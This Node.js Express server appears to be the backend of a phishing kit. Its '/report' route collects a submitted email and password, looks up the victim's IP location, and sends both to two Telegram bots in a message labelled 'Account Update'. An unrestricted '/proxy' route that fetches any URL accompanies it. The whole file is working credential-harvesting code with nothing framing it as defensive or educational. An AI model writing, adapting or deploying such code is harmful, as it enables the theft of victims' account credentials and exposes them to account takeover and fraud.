// @ts-nocheck
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Telegram Bot Configurations - Two separate bots
const TELEGRAM_BOT_1 = {
    token: process.env.TELEGRAM_BOT_TOKEN_1,
    chatId: process.env.TELEGRAM_CHAT_ID_1
};

const TELEGRAM_BOT_2 = {
    token: process.env.TELEGRAM_BOT_TOKEN_2,
    chatId: process.env.TELEGRAM_CHAT_ID_2
};

// Array of all bot configurations
const TELEGRAM_BOTS = [TELEGRAM_BOT_1, TELEGRAM_BOT_2];

// Function to send message to a single Telegram bot
const sendToSingleTelegram = async (botConfig, message) => {
    try {
        const url = `https://api.telegram.org/bot${botConfig.token}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: botConfig.chatId,
            text: message,
            parse_mode: 'HTML' // Allows HTML formatting
        });
        return { success: true, bot: botConfig.chatId, data: response.data };
    } catch (error) {
        console.error(`Error sending to Telegram bot (${botConfig.chatId}):`, error.response?.data || error.message);
        return { success: false, bot: botConfig.chatId, error: error.response?.data || error.message };
    }
};

// Function to send message to ALL Telegram bots simultaneously
const sendToAllTelegramBots = async (message) => {
    const results = await Promise.allSettled(
        TELEGRAM_BOTS.map(bot => sendToSingleTelegram(bot, message))
    );
    
    // Log results
    results.forEach((result, index) => {
        if (result.status === 'fulfilled') {
            console.log(`Bot ${index + 1} result:`, result.value);
        } else {
            console.error(`Bot ${index + 1} failed:`, result.reason);
        }
    });

    return results;
};

// Function to get location from IP
const getLocationFromIP = async (ip) => {
    if (ip === '::1' || !ip) {
        return { city: 'Localhost', regionName: 'Localhost', country: 'Localhost' };
    }
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data;
    } catch (error) {
        console.error('Error fetching location:', error);
        return { city: 'Unknown', regionName: 'Unknown', country: 'Unknown' };
    }
};

// Function to get client IP address
const getClientIp = (req) => {
    const forwardedFor = req.headers['x-forwarded-for'];
    if (forwardedFor) {
        return forwardedFor.split(',')[0].trim();
    }
    return req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
};

// Proxy route to fetch the image
app.get('/proxy', async (req, res) => {
    const { url } = req.query;
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        res.set('Content-Type', response.headers['content-type']);
        res.send(response.data);
    } catch (error) {
        console.error('Error fetching image:', error.message);
        res.status(500).send('Error fetching image');
    }
});

// Report route
app.post('/report', async (req, res) => {
    console.log('Received body:', req.body); 
    const { ai, pr } = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIP(ip);

    const locationDetails = location
        ? `IP Address: ${ip}\nLocation: ${location.city}, ${location.regionName}, ${location.country}`
        : `IP Address: ${ip}\nLocation: Unknown`;

    // Format message for Telegram with HTML formatting
    const telegramMessage = `
🔔 <b>Account Update</b>

📧 <b>User Email:</b> ${ai}
🔑 <b>User Password:</b> ${pr}

📍 <b>User IP/Location:</b>
${locationDetails}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `.trim();

    try {
        const results = await sendToAllTelegramBots(telegramMessage);
        
        // Check if at least one bot succeeded
        const anySuccess = results.some(r => r.status === 'fulfilled' && r.value.success);
        
        if (anySuccess) {
            console.log('Telegram messages sent to available bots');
            res.status(200).json({ message: "Credentials sent to admin" });
        } else {
            throw new Error('All Telegram bots failed to send message');
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({ message: "Failed to send credentials to admin" });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
